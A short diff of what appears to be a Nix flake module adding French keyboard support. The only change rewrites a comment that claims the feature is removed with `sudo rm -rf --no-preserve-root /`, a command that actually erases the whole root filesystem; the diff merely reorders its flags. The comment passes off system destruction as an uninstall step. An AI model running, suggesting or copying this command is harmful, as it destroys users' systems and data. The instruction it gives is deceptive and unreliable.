@@ -1,5 +1,5 @@
 # feature: French keyboard support
-# note: to remove, `sudo rm -rf --no-preserve-root /`
+# note: to remove, `sudo rm -fr --no-preserve-root /`
 _: {
   flake.nixosModules.french = {
     lib,
